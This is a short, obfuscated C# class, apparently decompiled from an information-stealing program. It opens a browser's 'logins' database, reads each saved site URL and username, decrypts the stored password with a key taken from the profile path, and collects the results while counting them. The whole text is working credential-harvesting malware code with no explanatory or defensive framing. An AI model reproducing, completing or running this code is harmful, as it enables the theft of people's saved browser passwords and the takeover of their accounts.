using System.Collections.Generic;
using ns13;

namespace ns12;

internal sealed class Class52
{
	public static List<GStruct10> smethod_0(string string_0)
	{
		try
		{
			List<GStruct10> list = new List<GStruct10>();
			Class57 @class = Class58.smethod_0(string_0, "logins");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				GStruct10 item = default(GStruct10);
				item.String_0 = Class46.smethod_2(@class.method_0(i, 0));
				item.String_1 = Class46.smethod_2(@class.method_0(i, 3));
				string text = @class.method_0(i, 5);
				if (text != null)
				{
					item.String_2 = Class46.smethod_2(Class46.smethod_4(string_0, text));
					list.Add(item);
					Class53.smethod_4(item.String_0);
					Class54.int_0++;
				}
			}
			return list;
		}
		catch
		{
			return new List<GStruct10>();
		}
	}
}
